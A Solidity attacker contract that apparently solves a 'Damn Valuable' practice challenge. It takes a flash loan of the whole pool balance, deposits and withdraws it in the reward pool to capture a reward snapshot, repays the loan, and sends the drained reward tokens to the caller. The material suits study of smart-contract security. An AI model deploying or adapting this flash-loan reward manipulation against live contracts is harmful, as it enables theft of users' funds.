// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackerProxyReward {

    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarder;
    RewardToken public immutable rewardToken;

    constructor(address poolAddress, address liquidityTokenAddress, address rewarderAddress, address rewardTokenAddress) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarder = TheRewarderPool(rewarderAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }

    function drainReward() external {
        pool.flashLoan(liquidityToken.balanceOf(address(pool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

}